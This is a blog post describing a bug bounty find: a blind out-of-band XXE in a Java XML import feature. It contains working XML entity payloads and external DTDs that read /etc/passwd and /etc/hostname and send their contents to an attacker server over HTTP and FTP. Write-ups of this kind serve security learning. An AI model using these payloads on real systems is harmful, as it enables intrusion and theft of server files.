<!DOCTYPE html>
<html lang="en-gb"><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
<meta http-equiv="content-type" content="text/html">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title itemprop="name">My first OOB XXE exploitation | Joshua MARTINELLE</title>
<meta property="og:title" content="My first OOB XXE exploitation | Joshua MARTINELLE" />
<meta name="twitter:title" content="My first OOB XXE exploitation | Joshua MARTINELLE" />
<meta itemprop="name" content="My first OOB XXE exploitation | Joshua MARTINELLE" />
<meta name="application-name" content="My first OOB XXE exploitation | Joshua MARTINELLE" />
<meta property="og:site_name" content="Joshua MARTINELLE" />

<meta name="description" content="My First OOB XXE Exploitation">
<meta itemprop="description" content="My First OOB XXE Exploitation" />
<meta property="og:description" content="My First OOB XXE Exploitation" />
<meta name="twitter:description" content="My First OOB XXE Exploitation" />

<meta property="og:locale" content="en-gb" />
<meta name="language" content="en-gb" />

  <link rel="alternate" hreflang="en-gb" href="http://localhost:1313/posts/2021/my_first_oob_xxe_exploitation/" title="" />





    
    
    

    <meta property="og:type" content="article" />
    <meta property="og:article:published_time" content=2021-04-30T12:00:00&#43;0100 />
    <meta property="article:published_time" content=2021-04-30T12:00:00&#43;0100 />
    <meta property="og:url" content="http://localhost:1313/posts/2021/my_first_oob_xxe_exploitation/" />

    

    

    <script defer type="application/ld+json">
    {
        "@context": "http://schema.org",
        "@type": "Article",
        "headline": "My first OOB XXE exploitation",
        "author": {
        "@type": "Person",
        "name": ""
        },
        "datePublished": "2021-04-30",
        "description": "My First OOB XXE Exploitation",
        "wordCount":  1048 ,
        "mainEntityOfPage": "True",
        "dateModified": "2021-04-30",
        "image": {
        "@type": "imageObject",
        "url": ""
        },
        "publisher": {
        "@type": "Organization",
        "name": "Joshua MARTINELLE"
        }
    }
    </script>


<meta name="generator" content="Hugo 0.145.0">

    
    <meta property="og:url" content="http://localhost:1313/posts/2021/my_first_oob_xxe_exploitation/">
  <meta property="og:site_name" content="Joshua MARTINELLE">
  <meta property="og:title" content="My first OOB XXE exploitation">
  <meta property="og:description" content="My First OOB XXE Exploitation">
  <meta property="og:locale" content="en_gb">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2021-04-30T12:00:00+01:00">
    <meta property="article:modified_time" content="2021-04-30T12:00:00+01:00">


    
    
  <meta name="twitter:card" content="summary">
  <meta name="twitter:title" content="My first OOB XXE exploitation">
  <meta name="twitter:description" content="My First OOB XXE Exploitation">


    

    <link rel="canonical" href="http://localhost:1313/posts/2021/my_first_oob_xxe_exploitation/">
    <link href="/style.min.2d921c18cf1ec555ffc03d59a8adc211c402c68c930c27d6a0c306ab175a8d09.css" rel="stylesheet">
    <link href="/code-highlight.min.706d31975fec544a864cb7f0d847a73ea55ca1df91bf495fd12a177138d807cf.css" rel="stylesheet">

    
    <link rel="apple-touch-icon" sizes="180x180" href="/icons/apple-touch-icon.png">
    <link rel="icon" type="image/png" sizes="32x32" href="/icons/favicon-32x32.png">
    <link rel="icon" type="image/png" sizes="16x16" href="/icons/favicon-16x16.png">
    <link rel="mask-icon" href="/icons/safari-pinned-tab.svg">
    <link rel="shortcut icon" href="/favicon.ico">




<link rel="manifest" href="http://localhost:1313/site.webmanifest">

<meta name="msapplication-config" content="/browserconfig.xml">
<meta name="msapplication-TileColor" content="#2d89ef">
<meta name="theme-color" content="#434648">

    
    <link rel="icon" type="image/svg+xml" href="/icons/favicon.svg">

    
    
</head>
<body data-theme = "light" class="notransition">

<script src="/js/theme.js"></script>

<div class="navbar" role="navigation">
    <nav
        class="menu"
        aria-label="Main Navigation"
        style="
            display: flex;
            align-items: center;
            justify-content: space-between;
            width: 100%;
            padding: 0 10px;
        "
    >
        <div style="display: flex; align-items: center; gap: 10px">
            <svg viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" stroke="#000000" width="25" height="25" stroke-width="0.304"><g id="SVGRepo_bgCarrier" stroke-width="0"></g><g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round"></g><g id="SVGRepo_iconCarrier"> <path fill-rule="evenodd" clip-rule="evenodd" d="M15 1H1V15H15V1ZM6 5L7.41421 6.41421L5.82843 8L7.41421 9.58579L6 11L3 8L6 5ZM10 5L8.58579 6.41421L10.1716 8L8.58579 9.58579L10 11L13 8L10 5Z" fill="#ffffff"></path> </g></svg>

            <a
                href="/"
                style="font-weight: bold; text-decoration: none; color: inherit"
                >Joshua MARTINELLE</a
            >
        </div>

        <div style="display: flex; align-items: center; margin-right: 2vh">
            <a
                href="https://github.com/JoshuaMART"
                class="logo"
                style="margin-right: 12px; display: block"
            >
                <svg class="mode-sunny" viewBox="0 0 20 20" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" fill="currentColor" width="20" height="20"><g id="SVGRepo_bgCarrier" stroke-width="0"></g><g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round"></g><g id="SVGRepo_iconCarrier"> <title>GITHUB</title> <desc>Created with Sketch.</desc> <defs> </defs> <g id="Page-1" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd"> <g id="Dribbble-Light-Preview" transform="translate(-140.000000, -7559.000000)" fill="currentColor"> <g id="icons" transform="translate(56.000000, 160.000000)"> <path d="M94,7399 C99.523,7399 104,7403.59 104,7409.253 C104,7413.782 101.138,7417.624 97.167,7418.981 C96.66,7419.082 96.48,7418.762 96.48,7418.489 C96.48,7418.151 96.492,7417.047 96.492,7415.675 C96.492,7414.719 96.172,7414.095 95.813,7413.777 C98.04,7413.523 100.38,7412.656 100.38,7408.718 C100.38,7407.598 99.992,7406.684 99.35,7405.966 C99.454,7405.707 99.797,7404.664 99.252,7403.252 C99.252,7403.252 98.414,7402.977 96.505,7404.303 C95.706,7404.076 94.85,7403.962 94,7403.958 C93.15,7403.962 92.295,7404.076 91.497,7404.303 C89.586,7402.977 88.746,7403.252 88.746,7403.252 C88.203,7404.664 88.546,7405.707 88.649,7405.966 C88.01,7406.684 87.619,7407.598 87.619,7408.718 C87.619,7412.646 89.954,7413.526 92.175,7413.785 C91.889,7414.041 91.63,7414.493 91.54,7415.156 C90.97,7415.418 89.522,7415.871 88.63,7414.304 C88.63,7414.304 88.101,7413.319 87.097,7413.247 C87.097,7413.247 86.122,7413.234 87.029,7413.87 C87.029,7413.87 87.684,7414.185 88.139,7415.37 C88.139,7415.37 88.726,7417.2 91.508,7416.58 C91.513,7417.437 91.522,7418.245 91.522,7418.489 C91.522,7418.76 91.338,7419.077 90.839,7418.982 C86.865,7417.627 84,7413.783 84,7409.253 C84,7403.59 88.478,7399 94,7399" id="github-[#142]"> </path> </g> </g> </g> </g></svg>

            </a>

            <a id="mode" href="#" style="display: block">
                <svg xmlns="http://www.w3.org/2000/svg" class="mode-sunny" width="20" height="20" viewBox="0 0 14 14" stroke-width="1">
<title>LIGHT</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></circle><line x1="7" y1="0.5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="0.5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line></g></svg> <svg xmlns="http://www.w3.org/2000/svg" class="mode-moon" width="20" height="20" viewBox="0 0 14 14" stroke-width="1">
<title>DARK</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></circle><line x1="7" y1="0.5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="0.5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line></g></svg>
            </a>
        </div>
    </nav>
</div>

<div class="wrapper post">
    <main class="page-content" aria-label="Content">
        <article>
            <header class="header">
                <h1 class="header-title">My first OOB XXE exploitation</h1>
                
                
                
                <div class="post-meta">
                    <time datetime="2021-04-30T12:00:00&#43;01:00" itemprop="datePublished"> 30 Apr 2021 </time>
                </div>
                
            </header>
            
            <div class="page-content">
                <p><img src="/posts/2021/my_first_oob_xxe_exploitation/banner.png" alt=""></p>
<p>Recently on a BugBounty program I came across my first XXE, blind what&rsquo;s more, as I found this case interesting I wanted to share it here.</p>
<h2 id="recon">Recon</h2>
<p>The recognition phase is quite basic, the scope is composed of a single URL with 2 distinct backends (administrators and users). For each of these backends the users&rsquo; view is limited according to the rights they have.</p>
<ul>
<li><a href="https://domain.tld/admin">https://domain.tld/admin</a> =&gt; URL for admin backend</li>
<li><a href="https://domain.tld/users">https://domain.tld/users</a> =&gt; URL for users backend</li>
</ul>
<p>I started to navigate in the application and all the tabs to understand how it works, although the scope is reduced the application is not very intuitive which makes its understanding a bit complicated.</p>
<p>After a few vulnerabilities found, the application seems rather robust, no &ldquo;easy vulnerability&rdquo;, however, my eye is focused on a parameter of the admin side configuration page, a parameter named &ldquo;tag configuration for XML file import&rdquo;. Hum interesting &hellip; I quickly searched or imported an XML file, this import is not on the admin side but on the user side.</p>
<h2 id="never-trust-user-input-application-message">Never trust <del>user input</del> application message</h2>
<p>Luckily, the import page also allows you to download a template that will be valid for the application. So I downloaded this template and added a payload to display the content of <em>/etc/passwd</em> but &hellip; error message : &ldquo;Invalid XML file (possible causes could be the use of DTDs or external entities for example)&rdquo;.</p>
<p>Hum&hellip; yet the response time of the server intrigued me. Rather than directly pointing me to an error, there was a loading time. Well&hellip; let&rsquo;s try something else.</p>
<p>Rather than trying to display the content of a file, I tried to see the use of ENTITIY is possible by forcing the server to make a request to my burp collaborator by including the following payload directly in the XML file :</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="cp">&lt;!DOCTYPE root [&lt;!ENTITY % ext SYSTEM &#34;http://{BURP_COLLABORATOR_URL}/&#34;&gt;</span> %ext;]&gt;
</span></span></code></pre></div><p>I upload and hop &hellip; after a few seconds, an HTTP request to my burp collaborator. So despite the error message, the file is well parsed and it is possible to use ENTITIES</p>
<p><img src="/posts/2021/my_first_oob_xxe_exploitation/XXE_OOB_Burp_Collaborator_Client.png" alt="XXE_OOB_Burp_Collaborator_Client"></p>
<h2 id="exploitation">Exploitation</h2>
<p>All right, cool, let&rsquo;s try something else. I tried to extract the content from /etc/passwd and send it to my burp collaborator (blind XXE to exfiltrate data out-of-band) :</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="cp">&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY &gt;&lt;!ENTITY % xxe SYSTEM &#34;file:///etc/passwd&#34; &gt;</span>
</span></span><span class="line"><span class="cl"><span class="cp">&lt;!ENTITY callhome SYSTEM &#34;http://{BURP_COLLABORATOR_URL}/?%xxe;&#34;&gt;</span>]&gt;
</span></span><span class="line"><span class="cl"><span class="nt">&lt;foo&gt;</span><span class="ni">&amp;callhome;</span><span class="nt">&lt;/foo&gt;</span>
</span></span></code></pre></div><p>But&hellip; nothing. Okay, so then I tested it with an external dtd (In my case, I used an external server (VPS) with a python web server (<code>python3 -m http.server 80</code>) to deliver the payload and retrieve the content :</p>
<p><em>payload in the uploaded XML file :</em></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="cp">&lt;!DOCTYPE foo [ &lt;!ENTITY % pe SYSTEM &#34;http://{MY_SERVER_IP}/x.dtd&#34;&gt;</span> %pe; %param1; ]&gt;
</span></span><span class="line"><span class="cl"><span class="nt">&lt;foo&gt;</span><span class="ni">&amp;external;</span><span class="nt">&lt;/foo&gt;</span>
</span></span></code></pre></div><p><em>external dtd named x.dtd :</em></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="cp">&lt;!ENTITY % stuff SYSTEM &#34;file:///etc/pasword&#34;&gt;</span>
</span></span><span class="line"><span class="cl"><span class="cp">&lt;!ENTITY % param1 &#34;&lt;!ENTITY external SYSTEM &#39;http://{MY_SERVER_IP}/?data=%stuff;&#39;&gt;</span>&#34;&gt;
</span></span></code></pre></div><p>I save, I up the server, I send back the malicious XML file, the server comes to get my DTD and sends me back but without the content of the file <em>/etc/passwd</em> &hellip; what ????</p>
<p>I do not despair and I tried with a dtd of test to see if I recover well the desired value, this dtd is thus just used to validate that I recover well the parameter &ldquo;toto&rdquo; :</p>
<p><em>payload in the uploaded XML file :</em></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="cp">&lt;!DOCTYPE foo [ &lt;!ENTITY % pe SYSTEM &#34;http://{MY_SERVER_IP}/x.dtd&#34;&gt;</span> %pe; %param1; ]&gt;
</span></span><span class="line"><span class="cl"><span class="nt">&lt;foo&gt;</span><span class="ni">&amp;external;</span><span class="nt">&lt;/foo&gt;</span>
</span></span></code></pre></div><p><em>external dtd named x.dtd :</em></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="cp">&lt;!ENTITY % stuff &#34;toto&#34;&gt;</span>
</span></span><span class="line"><span class="cl"><span class="cp">&lt;!ENTITY % param1 &#34;&lt;!ENTITY external SYSTEM &#39;http://{MY_SERVER_IP}/p?data=%stuff;&#39;&gt;</span>&#34;&gt;
</span></span></code></pre></div><p>Let&rsquo;s start again, I save, I up the server, I send back the XML file, the server retrieves the DTD and I have the return with the value <em>toto</em> in the variable <em>?data=</em>.</p>
<p>After some research I saw that it was sometimes not possible to extract the contents of a file that includes some characters or line breaks (which is the case of <em>/etc/passwd</em>).</p>
<p>In PHP it would have been possible to use a dtd like this:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="cp">&lt;!ENTITY % stuff SYSTEM &#34;php://filter/convert.base64-encode/resource=/etc/passwd&#34;&gt;</span>
</span></span><span class="line"><span class="cl"><span class="cp">&lt;!ENTITY % param1 &#34;&lt;!ENTITY external SYSTEM &#39;http://{MY_SERVER_IP}/p?data=%stuff;&#39;&gt;</span>&#34;&gt;
</span></span></code></pre></div><p>To encode the whole thing in base64, the return of the complete file would have been done, you would have just had to decode it to get the whole file. Unfortunately the backend here is Java and I couldn&rsquo;t find an alternative.</p>
<p>So before digging I tried another file, <em>/etc/hostname</em> :
<em>payload in the uploaded XML file :</em></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="cp">&lt;!DOCTYPE foo [ &lt;!ENTITY % pe SYSTEM &#34;http://{MY_SERVER_IP}/x.dtd&#34;&gt;</span> %pe; %param1; ]&gt;
</span></span><span class="line"><span class="cl"><span class="nt">&lt;foo&gt;</span><span class="ni">&amp;external;</span><span class="nt">&lt;/foo&gt;</span>
</span></span></code></pre></div><p><em>external dtd named x.dtd :</em></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="cp">&lt;!ENTITY % stuff SYSTEM &#34;file:///etc/hostname&#34;&gt;</span>
</span></span><span class="line"><span class="cl"><span class="cp">&lt;!ENTITY % param1 &#34;&lt;!ENTITY external SYSTEM &#39;http://{MY_SERVER_IP}/?data=%stuff;&#39;&gt;</span>&#34;&gt;
</span></span></code></pre></div><p>Once again, I restart the web server, I send the XML, the server comes looking for my DTD and boom! the content of /etc/hostname is added as a parameter to the <em>?data=</em> variable.</p>
<p>This could have been enough as PoC but I kept on digging. Don&rsquo;t settle for the simplest, try to demonstrate the impact of your vulnerabilities !</p>
<h2 id="digging">Digging</h2>
<p>After some research I saw that it is possible to use the FTP protocol, which seems to be less troublesome than the <em>file://</em> wrapper for data extraction like this :</p>
<p><em>payload in the uploaded XML file :</em></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="cp">&lt;!DOCTYPE foo [ &lt;!ENTITY % pe SYSTEM &#34;http://{MY_SERVER_IP}/x.dtd&#34;&gt;</span> %pe; %param1; ]&gt;
</span></span><span class="line"><span class="cl"><span class="nt">&lt;foo&gt;</span><span class="ni">&amp;external;</span><span class="nt">&lt;/foo&gt;</span>
</span></span></code></pre></div><p><em>external dtd named x.dtd :</em></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="cp">&lt;!ENTITY % stuff SYSTEM &#34;file:///etc/passwd&#34;&gt;</span>
</span></span><span class="line"><span class="cl"><span class="cp">&lt;!ENTITY % param1 &#34;&lt;!ENTITY external SYSTEM &#39;ftp://{MY_SERVER_IP}/%stuff;&#39;&gt;</span>&#34;&gt;
</span></span></code></pre></div><p>For the FTP server, I used <a href="https://github.com/staaldraad/xxeserv">xxeserv</a> which is specially designed for data extraction via FTP with a XXE OOB.</p>
<p>Here we go again. restart the web server, I send the XML, the server comes looking for my DTD and boom! Oh no &hellip; only a partial content of /etc/passwd is displayed :</p>
<p><img src="/posts/2021/my_first_oob_xxe_exploitation/XXE_OOB_Etc_Passwd.png" alt="XXE_OOB_Etc_Passwd"></p>
<p>After some research this is related to the version of Java used and unfortunately I have not found a solution to this problem.</p>
<h2 id="conclusion">Conclusion</h2>
<p>So I found other leaks that I could extract and made my report.
Unfortunately&hellip; duplicate ¯_(ツ)_/¯</p>
<p>The labs etc&hellip; are very good for training but we are often far from reality, despite having done a lot of labs dealing with the twentieth century I still spent time to successfully exploit it and for the blow despite this duplicate, this vulnerability has taught me a lot, what better for a first XXE (in bugbounty) than a XXE OOB blind especially since it was even more formative by showing that it is necessary not to stop at the first inconclusive attempt.</p>

            </div>
        </article></main>
</div>
<footer class="footer">
    <span class="footer_item"> </span>
    &nbsp;

    <div class="footer_social-icons">
</div>
    <small class="footer_copyright">
        © 2025 .
        Powered by <a href="https://github.com/hugo-sid/hugo-blog-awesome" target="_blank" rel="noopener">Hugo blog awesome</a>.
    </small>
</footer><a href="#" title="Go to top" id="totop">
    <svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" fill="currentColor" stroke="currentColor" viewBox="0 96 960 960">
    <path d="M283 704.739 234.261 656 480 410.261 725.739 656 677 704.739l-197-197-197 197Z"/>
</svg>

</a>


    






    
    <script async src="http://localhost:1313/js/main.js" ></script>

    

</body>
</html>
